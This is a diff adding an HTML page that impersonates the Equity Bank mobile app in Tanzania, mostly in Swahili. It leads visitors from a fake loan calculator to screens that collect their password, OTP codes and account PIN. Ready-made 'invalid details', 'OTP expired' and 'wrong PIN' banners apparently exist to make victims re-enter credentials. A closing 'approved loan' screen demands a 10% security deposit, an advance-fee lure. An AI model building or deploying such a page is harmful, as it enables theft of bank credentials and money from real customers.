@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Equity Mobile</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- SCREEN 1: WELCOMING SCREEN (EQUITY MOBILE SPLASH) -->
+  <section id="screen-welcome" class="screen equity-splash-bg active">
+    <div class="top-nav-bar">
+      <div class="lang-selector">
+        <span id="welcome-lang-icon">🌐</span>
+        <span id="welcome-lang-text">Eng</span>
+        <small>▾</small>
+      </div>
+      <div class="top-icon">💬</div>
+    </div>
+
+    <div class="splash-content">
+      <div class="equity-logo-container">
+        <div class="equity-roof"></div>
+        <div class="equity-text">EQUITY</div>
+      </div>
+
+      <h1 class="splash-title" id="txt-welcome-title">Welcome to Equity mobile</h1>
+      <p class="splash-sub" id="txt-welcome-sub">Good afternoon! Sign in or register to continue</p>
+    </div>
+
+    <div class="splash-actions">
+      <button id="btn-welcome-signin" class="btn-equity-white">Sign in</button>
+      <button id="btn-welcome-register" class="btn-equity-outline">Register</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 2: HATUA 1 YA 3 (LOAN CALCULATOR) -->
+  <section id="screen-step1" class="screen">
+    <header class="inner-header">
+      <button class="back-btn" id="btn-step1-back">←</button>
+      <div class="header-branding">
+        <div class="brand-text">EQUITY</div>
+        <small class="country-badge" id="badge-country-1">TANZANIA</small>
+      </div>
+      <div class="header-flag" id="flag-display-1">🇹🇿</div>
+    </header>
+
+    <div class="progress-bar-container">
+      <div class="step-label" id="lbl-step1">Hatua 1 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <h3 class="form-title" id="lbl-calc-title">Kikokotoo cha Mkopo</h3>
+
+      <div class="form-group">
+        <label id="lbl-loan-type">Aina ya Mkopo</label>
+        <select id="loan-type-select" class="input-select">
+          <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+          <option value="Mkopo wa Binafsi">Mkopo wa Binafsi</option>
+          <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+          <option value="Mkopo wa Elimu">Mkopo wa Elimu</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label id="lbl-loan-amount">Kiasi cha Mkopo</label>
+        <div class="slider-display" id="loan-amount-text">TSh 100,000</div>
+        <input type="range" id="loan-amount-slider" min="50000" max="10000000" step="50000" value="100000" class="range-red">
+        <div class="slider-limits">
+          <span>50,000</span>
+          <span>10,000,000</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label id="lbl-loan-months">Muda wa Mkopo (Miezi)</label>
+        <div class="slider-display" id="loan-months-text">Miezi 12</div>
+        <input type="range" id="loan-months-slider" min="6" max="60" step="6" value="12" class="range-red">
+        <div class="slider-limits">
+          <span>6</span>
+          <span>60</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label id="lbl-loan-purpose">Madhumuni ya Mkopo</label>
+        <textarea id="loan-purpose" class="input-textarea" placeholder="Elezea madhumuni..."></textarea>
+      </div>
+    </div>
+
+    <button id="btn-step1-next" class="btn-red-action">HATUA INAYOFUATA</button>
+  </section>
+
+  <!-- SCREEN 3: HATUA 2 YA 3 (PERSONAL DETAILS) -->
+  <section id="screen-step2" class="screen">
+    <header class="inner-header">
+      <button class="back-btn" id="btn-step2-back">←</button>
+      <div class="header-branding">
+        <div class="brand-text">EQUITY</div>
+        <small class="country-badge" id="badge-country-2">TANZANIA</small>
+      </div>
+      <div class="header-flag" id="flag-display-2">🇹🇿</div>
+    </header>
+
+    <div class="progress-bar-container">
+      <div class="step-label" id="lbl-step2">Hatua 2 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="form-row">
+        <div class="form-group half">
+          <label id="lbl-first-name">Jina la Kwanza</label>
+          <input type="text" id="first-name" class="input-text" placeholder="Jina la kwanza">
+        </div>
+        <div class="form-group half">
+          <label id="lbl-last-name">Jina la Ukoo</label>
+          <input type="text" id="last-name" class="input-text" placeholder="Jina la ukoo">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label id="lbl-phone-no">Nambari ya Simu</label>
+        <div class="phone-input-group">
+          <span class="flag-prefix" id="phone-flag-prefix">🇹🇿 +255</span>
+          <input type="text" id="phone-number" class="input-text" placeholder="712345678" maxlength="10">
+        </div>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button id="btn-step2-prev" class="btn-gray">ILIYOTANGULIA</button>
+      <button id="btn-step2-next" class="btn-red-action">HATUA INAYOFUATA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 4: HATUA 3 YA 3 (SUMMARY & CHECK PHOTOS) -->
+  <section id="screen-step3" class="screen">
+    <header class="inner-header">
+      <button class="back-btn" id="btn-step3-back">←</button>
+      <div class="header-branding">
+        <div class="brand-text">EQUITY</div>
+        <small class="country-badge" id="badge-country-3">TANZANIA</small>
+      </div>
+      <div class="header-flag" id="flag-display-3">🇹🇿</div>
+    </header>
+
+    <div class="progress-bar-container">
+      <div class="step-label" id="lbl-step3">Hatua 3 ya 3</div>
+      <div class="bars">
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+        <span class="bar active"></span>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="form-group">
+        <label id="lbl-employment">Hali ya Ajira</label>
+        <select id="employment-status" class="input-select">
+          <option value="Mfanyabiashara">Mfanyabiashara / Business</option>
+          <option value="Mwajiriwa">Mwajiriwa / Employed</option>
+          <option value="Mkulima">Mkulima / Farmer</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label id="lbl-income">Mapato ya Mwaka</label>
+        <input type="text" id="annual-income" class="input-text" placeholder="Weka mapato">
+      </div>
+
+      <div class="summary-box">
+        <h4 id="lbl-sum-title">Muhtasari wa Maombi</h4>
+        <div class="summary-row"><span id="lbl-sum-amt">Kiasi:</span> <strong id="sum-amount">TSh 100,000</strong></div>
+        <div class="summary-row"><span id="lbl-sum-mth">Muda:</span> <strong id="sum-months">Miezi 12</strong></div>
+        <div class="summary-row"><span id="lbl-sum-prp">Madhumuni:</span> <strong id="sum-purpose">Biashara</strong></div>
+        <div class="summary-row"><span id="lbl-sum-app">Mwombaji:</span> <strong id="sum-name">N/A</strong></div>
+      </div>
+    </div>
+
+    <div class="btn-group-row">
+      <button id="btn-step3-prev" class="btn-gray">ILIYOTANGULIA</button>
+      <button id="btn-step3-next" class="btn-red-action">WASILISHA MAOMBI</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 5: LOGIN CREDENTIALS (WELCOME BACK) -->
+  <section id="screen-login" class="screen white-screen">
+    <div class="top-nav-simple">
+      <button class="back-btn-dark" id="btn-login-back">‹</button>
+      <div class="chat-icon-dark">💬</div>
+    </div>
+
+    <div class="login-header-text">
+      <h2 id="lbl-welcome-back">Welcome back</h2>
+      <h3 id="lbl-hello-there">Hello there,</h3>
+      <p id="lbl-login-sub">Sign in to continue. Remember, your password is yours, do not share it with anyone.</p>
+    </div>
+
+    <!-- SURFACE ERROR BANNER -->
+    <div id="banner-creds-error" class="surface-error-banner">
+      INVALID ACC. DETAILS ❌ Please check your email/mobile or password.
+    </div>
+
+    <div class="form-group-clean">
+      <label id="lbl-country-select">Country</label>
+      <div class="dropdown-wrapper">
+        <select id="country-dropdown" class="input-clean-select">
+          <option value="Tanzania, United Republic of" selected>Tanzania, United Republic of</option>
+          <option value="Kenya">Kenya</option>
+          <option value="Uganda">Uganda</option>
+          <option value="Rwanda">Rwanda</option>
+          <option value="South Sudan">South Sudan</option>
+        </select>
+        <span class="dropdown-arrow">▾</span>
+      </div>
+    </div>
+
+    <div class="form-group-clean">
+      <label id="lbl-identifier">Email address or mobile number</label>
+      <input type="text" id="login-identifier" class="input-clean" placeholder="Email address or mobile number">
+    </div>
+
+    <div class="form-group-clean">
+      <label id="lbl-password">Password</label>
+      <div class="password-input-wrapper">
+        <input type="password" id="login-password" class="input-clean" placeholder="Enter password">
+        <span class="eye-toggle" id="toggle-password">👁</span>
+      </div>
+    </div>
+
+    <div class="forgot-link">
+      <a href="#" id="lbl-forgot-pass">Forgot your password?</a>
+    </div>
+
+    <div class="login-action-bottom">
+      <button id="btn-submit-login" class="btn-equity-disabled">Sign in</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 6: OTP VERIFICATION -->
+  <section id="screen-otp" class="screen white-screen">
+    <div class="top-nav-simple">
+      <button class="back-btn-dark" id="btn-otp-back">‹</button>
+      <div class="chat-icon-dark">💬</div>
+    </div>
+
+    <div class="login-header-text">
+      <h2 id="lbl-otp-title">Uthibitisho wa OTP</h2>
+      <p id="lbl-otp-sub">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
+    </div>
+
+    <!-- SURFACE ERROR BANNER -->
+    <div id="banner-otp-error" class="surface-error-banner">
+      OTP EXPIRES ❌ Please enter the new OTP code sent to your phone.
+    </div>
+
+    <div class="otp-card-container">
+      <div class="otp-success-notice">
+        ✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.
+      </div>
+
+      <div class="otp-boxes-flex">
+        <input type="text" class="otp-box-num" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" class="otp-box-num" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-num" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-num" maxlength="1" inputmode="numeric">
+      </div>
+
+      <div class="timer-text" id="lbl-timer">Tuma tena msimbo ndani ya 40 sekunde</div>
+    </div>
+
+    <div class="login-action-bottom">
+      <button id="btn-submit-otp" class="btn-equity-disabled">WASILISHA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 7: ACCOUNT NUMBER & ACCOUNT PIN -->
+  <section id="screen-pin" class="screen white-screen">
+    <div class="top-nav-simple">
+      <button class="back-btn-dark" id="btn-pin-back">‹</button>
+      <div class="chat-icon-dark">💬</div>
+    </div>
+
+    <div class="login-header-text">
+      <h2 id="lbl-pin-title">Ingia Akaunti</h2>
+      <p id="lbl-pin-sub">Weka namba yako ya simu na PIN ya akaunti</p>
+    </div>
+
+    <!-- SURFACE ERROR BANNER -->
+    <div id="banner-pin-error" class="surface-error-banner">
+      WRONG PIN ❌ Incorrect account PIN. Please try again.
+    </div>
+
+    <div class="card-box-clean">
+      <div class="form-group-clean">
+        <label id="lbl-pin-phone">Nambari ya Simu / Account No</label>
+        <div class="phone-input-group">
+          <span class="flag-prefix" id="pin-flag-prefix">🇹🇿 +255</span>
+          <input type="text" id="pin-phone-input" class="input-text" placeholder="712345678" inputmode="numeric">
+        </div>
+      </div>
+
+      <div class="form-group-clean align-center">
+        <label id="lbl-pin-4">Weka PIN yako (tarakimu 4)</label>
+        <div class="pin-boxes-flex">
+          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box-num" maxlength="1" inputmode="numeric">
+          <span class="pin-eye-icon" id="toggle-pin-visibility">👁</span>
+        </div>
+      </div>
+
+      <div class="forgot-link align-center">
+        <a href="#" id="lbl-forgot-pin">Umesahau PIN?</a>
+      </div>
+    </div>
+
+    <div class="login-action-bottom">
+      <button id="btn-submit-pin" class="btn-equity-disabled">INGIA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 8: SUCCESS & APPROVED SCREEN -->
+  <section id="screen-success" class="screen">
+    <div class="card-box align-center margin-top-20">
+      <div class="success-icon">✓</div>
+      <h2 class="title-red" id="lbl-succ-title">Hongera! Mkopo Wako Umeidhinishwa 🎉</h2>
+
+      <div class="approved-amount-box">
+        <span id="lbl-approved-heading">KIASI KILICHOIDHINISHWA</span>
+        <h1 id="final-approved-amount">TSh 100,000</h1>
+      </div>
+
+      <div class="dormant-alert-card">
+        <h4 id="lbl-dormant-head">⚠️ NOTISI YA UZINGATIAJI</h4>
+        <p id="lbl-dormant-body">
+          Akaunti yako ya Equity Bank lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba (TZS 50,000) ili kukamilisha utoaji wa fedha.
+        </p>
+        <p class="wait-text" id="lbl-wait-time">Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p>
+      </div>
+    </div>
+
+    <button id="btn-finish-home" class="btn-red-action">RUDI NYUMBANI</button>
+  </section>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title">INACHAKATA...</h3>
+    <p id="loading-sub">Tafadhali subiri kidogo.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+          </html>
+                                                     
